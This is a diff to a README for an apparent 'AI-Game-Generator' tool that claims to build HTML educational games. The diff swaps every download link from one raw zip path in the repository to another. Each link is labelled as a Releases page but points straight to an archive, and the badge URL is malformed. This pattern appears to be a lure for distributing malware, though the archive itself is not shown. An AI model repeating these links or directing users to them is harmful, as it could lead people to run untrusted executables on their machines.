@@ -1,7 +1,7 @@
 # 🎮 AI-Game-Generator - Create Fun Games Easily
 
 ## 📥 Download Now!
-[![Download Latest Release](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/static/Game_A_Generator_v1.2.zip%20Latest%https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/static/Game_A_Generator_v1.2.zip)](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/static/Game_A_Generator_v1.2.zip)
+[![Download Latest Release](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/backend/Game_A_Generator_2.5.zip%20Latest%https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/backend/Game_A_Generator_2.5.zip)](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/backend/Game_A_Generator_2.5.zip)
 
 ## 🚀 Getting Started
 Welcome to the **AI-Game-Generator** project! This application helps you create educational games quickly and easily. Using simple prompts, it generates fully playable HTML games that you can enjoy right away.
@@ -19,7 +19,7 @@ Welcome to the **AI-Game-Generator** project! This application helps you create 
 - Works on multiple operating systems
 
 ## 📥 Download & Install
-To get started, visit this page to download: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/static/Game_A_Generator_v1.2.zip). You will find the latest version along with previous versions if needed.
+To get started, visit this page to download: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/backend/Game_A_Generator_2.5.zip). You will find the latest version along with previous versions if needed.
 
 ### 🏷 How to Download
 1. Click the above link to open the Releases page.
@@ -68,4 +68,4 @@ A: After generating your game, you can save it and share the HTML file with anyo
 If you encounter any issues, feel free to open an issue on the GitHub repository or reach out for support. Your feedback helps us improve the application.
 
 ## 🎉 Conclusion
-We hope you enjoy using the **AI-Game-Generator**! Dive into the world of fun and education, and start creating your own games today. Don’t forget to visit this page to download the latest version: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/static/Game_A_Generator_v1.2.zip). Happy gaming!
+We hope you enjoy using the **AI-Game-Generator**! Dive into the world of fun and education, and start creating your own games today. Don’t forget to visit this page to download the latest version: [AI-Game-Generator Releases](https://github.com/ipuntoo/AI-Game-Generator/raw/refs/heads/main/backend/Game_A_Generator_2.5.zip). Happy gaming!
